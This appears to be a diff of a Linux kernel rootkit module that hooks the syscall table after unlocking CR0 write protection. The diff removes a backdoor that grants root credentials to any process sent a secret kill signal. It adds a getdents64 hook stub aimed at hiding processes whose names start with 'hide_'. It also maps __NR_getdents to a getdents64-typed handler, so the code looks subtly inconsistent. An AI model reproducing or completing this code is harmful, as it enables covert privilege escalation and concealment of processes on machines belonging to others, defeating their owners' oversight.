@@ -7,6 +7,7 @@
 #include <linux/sched.h>
 #include <linux/cred.h>
 #include <linux/uidgid.h>
+#include <linux/dirent.h>
 
 #define CR0_WRITE_UNLOCK(x) \
 	do { \
@@ -53,45 +54,17 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
 }
 
-//privilege escalation code
-int secretKillSig = 42;
-module_param(secretKillSig, int, 0);
-MODULE_PARM_DESC(secretKillSig, "define a kill signal which when used will replace the kill syscall with magic\n");
+#define process_to_hide "hide_"
 
-void escalateProcess(pid_t pid){
-	pr_info("escalation called for pid %d\n", pid);
-
-	struct task_struct * currentTask = get_current();
-	pr_info("current task struct has pid %d\n", currentTask->pid);
+asmlinkage long totallyReal_getdents64(unsigned int fd, struct linux_dirent64 __user * dire, unsigned int count) {
+	pr_info("Intercepted getdents of fd=%d %p %d\n", fd, dire, count);
 	
-	kuid_t kuid = KUIDT_INIT(0);
-	kgid_t kgid = KGIDT_INIT(0);
-
-	struct cred* elevatedCred = prepare_creds();
-	if(elevatedCred == NULL){
-		pr_info("ERROR: prepare_creds() returned NULL\n");
-		return;// -ENOMEM;
-	}
-	elevatedCred->uid = kuid;
-	elevatedCred->gid = kgid;
-	elevatedCred->euid = kuid;
-	elevatedCred->egid = kgid;
+	int output;
+	output = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[3]) )(fd, dire, count);
 	
-	pr_info("committing result %d\n", commit_creds(elevatedCred));
 	
-	return;
+	return output;
 }
-
-asmlinkage int totallyReal_kill(pid_t pid, int sig){
-	pr_info("kill issued on pid %d with sig %d\n", pid, sig);
-	if(sig == secretKillSig){
-		pr_info("secretKillSig used");
-		escalateProcess(pid);
-		return 0;
-	}
-	return ((typeof(sys_kill)*)(original_syscallPtrs[4]))(pid, sig);
-}
-//end privilege escalation code
 
 
 void injectSyscalls(void){
@@ -158,16 +131,14 @@ int __init loadMod(void){
 	syscall_names[2] = __NR_mkdir;
 	totallyReal_syscallPtrs[2] = (void *) &totallyReal_mkdir;
 	toInject[2] = 1;
-
-	toInject[3] = 0;	//getDents intercept is using targetIndex 3 in other branch
-
-	syscall_names[4] = __NR_kill;
-	totallyReal_syscallPtrs[4] = (void *) &totallyReal_kill;
-	toInject[4] = 1;
+	
+	syscall_names[3] = __NR_getdents;
+	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents64;
+	toInject[3] = 1;
 
 	injectSyscalls();
 
-	return 0;		
+	return 0;
 }
 
 void __exit unloadMod(void){
